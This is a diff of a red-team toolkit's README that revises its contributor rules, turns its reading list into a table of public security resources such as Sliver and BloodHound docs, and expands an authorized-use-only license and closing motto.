-PRs welcome from authorized red team operators. Please:
-- Don't commit real callback IPs or credentials
-- Don't include client-specific payloads or loot
-- Tag any new payloads with target OS and detection notes
+PRs are welcome from authorized red team operators. Before submitting:
+
+- **Do not** commit real callback IPs, credentials, or client-specific loot
+- **Do not** commit a modified `config.json` with real passwords or keys
+- **Do** tag new payload files with target OS, tested device, and any known AV detection
+- **Do** test configuration changes against `scripts/preflight.py`
+- Security findings: open an issue with a minimal reproduction case
 
 ---
 
-## 📚 Recommended Reading
+## 📚 Recommended Resources
 
-- *Red Team Warfare* — Sarang Tumne
-- *Red Team Operations* — MITRE ATT&CK aligned tradecraft
-- *The Hacker Playbook 3* — Peter Kim
-- Hak5 official docs: https://docs.hak5.org
+| Resource | Notes |
+|----------|-------|
+| *The Hacker Playbook 3* — Peter Kim | Field-proven red team TTPs |
+| *Red Team Development and Operations* — Joe Vest | Program-level methodology |
+| MITRE ATT&CK Framework | Map your techniques to adversary emulation plans |
+| Hak5 docs — [docs.hak5.org](https://docs.hak5.org) | Device-specific payload APIs |
+| Sliver wiki — [github.com/BishopFox/sliver/wiki](https://github.com/BishopFox/sliver/wiki) | C2 framework reference |
+| BloodHound CE docs — [support.bloodhoundenterprise.io](https://support.bloodhoundenterprise.io/) | AD attack path setup |
 
 ---
 
 ## 📜 License
 
-Released under an **Authorized Use Only** license. By cloning this repo you agree:
-1. You will only use HexBox on systems you own or have written authorization to test
+Released under an **Authorized Use Only** license. By cloning or using this repository you agree:
+
+1. You will only deploy HexBox against systems you **own** or have **explicit written authorization** to test
 2. You will not redistribute this toolkit to unauthorized parties
-3. You accept full legal responsibility for your actions
+3. You accept full legal and ethical responsibility for every action taken with this software
+4. You will comply with all applicable laws in your jurisdiction
 
 ---
 
 ## 💀 Final Word
 
-HexBox is a **force multiplier**, not a magic button. Real red teaming requires recon, patience, creativity, and discipline. This kit will get you operational fast — but **the operator behind it is the actual weapon.**
+HexBox is a **force multiplier** — not a magic button. Effective red teaming requires recon, patience, creativity, and operational discipline. This platform removes the friction of juggling seven different devices and interfaces so you can focus on the engagement.
+
+The tool amplifies your skill. It does not replace it.
 
 Stay sharp. Stay authorized. Stay on the dark side.
 
